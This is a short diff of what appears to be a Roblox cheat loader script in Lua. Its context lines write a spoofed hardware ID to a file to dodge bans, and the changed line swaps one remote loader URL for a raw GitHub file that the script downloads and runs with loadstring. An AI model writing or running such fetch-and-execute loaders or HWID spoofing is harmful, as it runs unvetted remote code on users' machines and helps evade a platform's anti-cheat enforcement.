@@ -6,4 +6,4 @@ writefile("Hoho_Intro.txt", spoofedHWID) -- Overwrite with the spoofed HWID
 script_key = "ezkcfPhJGknkroDLzvlAXZciLBhNFDOH";
 
 -- actual link to the game
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e4aedc7ccd2bacd83555baa884f3d4b1.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dd0409k/Something-/refs/heads/main/realdirect.lua"))()
